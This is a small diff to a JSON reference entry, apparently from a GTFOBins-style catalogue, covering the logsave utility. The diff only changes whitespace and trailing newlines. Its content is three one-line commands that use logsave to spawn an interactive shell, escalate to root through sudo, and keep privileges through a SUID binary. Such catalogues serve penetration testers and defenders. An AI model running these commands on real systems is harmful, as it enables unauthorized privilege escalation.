@@ -2,17 +2,20 @@
   "functions": {
     "shell": [
       {
-        "code": "logsave /dev/null /bin/sh -i"
+        
+        "code": "logsave /dev/null /bin/sh -i\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo logsave /dev/null /bin/sh -i"
+        
+        "code": "sudo logsave /dev/null /bin/sh -i\n"
       }
     ],
     "suid": [
       {
-        "code": "./logsave /dev/null /bin/sh -i -p"
+        
+        "code": "./logsave /dev/null /bin/sh -i -p\n"
       }
     ]
   }
